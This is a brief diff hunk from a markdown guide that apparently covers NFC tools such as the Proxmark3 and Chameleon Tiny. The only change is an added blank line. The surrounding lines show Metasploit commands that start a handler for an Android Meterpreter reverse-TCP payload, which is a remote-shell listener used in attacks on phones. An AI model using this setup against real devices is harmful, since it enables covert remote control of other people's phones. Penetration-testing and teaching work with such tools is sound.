@@ -50,6 +50,7 @@ This can be done with the proxmark3, chameleon tiny, or even just an NFC enabled
 `msfconsole -q`
 
 (inside msfconsole)
+
 `use exploit/multi/handler`
 
 `set payload android/meterpreter/reverse_tcp`
